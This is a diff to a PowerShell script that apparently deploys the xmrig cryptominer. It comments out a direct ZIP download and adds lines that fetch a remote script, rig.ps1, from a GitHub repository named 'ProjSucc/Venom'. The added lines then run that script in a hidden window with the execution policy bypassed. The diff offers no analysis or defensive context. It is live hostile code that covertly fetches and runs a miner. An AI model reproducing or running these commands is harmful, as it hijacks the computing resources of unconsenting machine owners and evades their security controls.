@@ -68,11 +68,15 @@ cd $wd
 $currentDirectory = $PWD
 
 # Download the ZIP file
-Invoke-WebRequest -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig-6.22.2-gcc-win64.zip" -OutFile "xmrig-6.22.2-gcc-win64.zip"
+# Invoke-WebRequest -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig-6.22.2-gcc-win64.zip" -OutFile "xmrig-6.22.2-gcc-win64.zip"
 
+
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/rig.ps1 -OutFile "rig.ps1"
+
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./rig.ps1
 
 # Extract the ZIP file in the current directory
-Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-gcc-win64.zip" -DestinationPath $currentDirectory
+Expand-Archive -Path "$currentDirectory\xmrig-6.22.2.zip" -DestinationPath $currentDirectory
 
 # Verify extraction
 Get-ChildItem -Path $currentDirectory
